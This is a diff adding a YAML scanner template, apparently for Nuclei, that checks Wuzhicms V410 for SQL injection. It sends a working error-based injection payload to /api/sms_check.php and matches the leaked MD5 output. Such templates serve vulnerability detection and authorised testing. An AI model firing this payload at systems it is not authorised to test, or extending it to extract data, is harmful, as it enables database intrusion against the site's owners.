@@ -1,0 +1,25 @@
+id: poc-yaml-wuzhicms-v410-sqli
+info:
+  name: Wuzhicms V410 SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  description: |
+    Wuzhicms V410 is vulnerable to SQL Injection, allowing attackers to execute arbitrary SQL commands.
+http:
+  - method: GET
+    path:
+      - "/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "81dc9bdb52d04dc20036dbd8313ed05"
+      - type: word
+        part: body
+        words:
+          - "sql_error:MySQL Query Error"
+      - type: status
+        status:
+          - 200
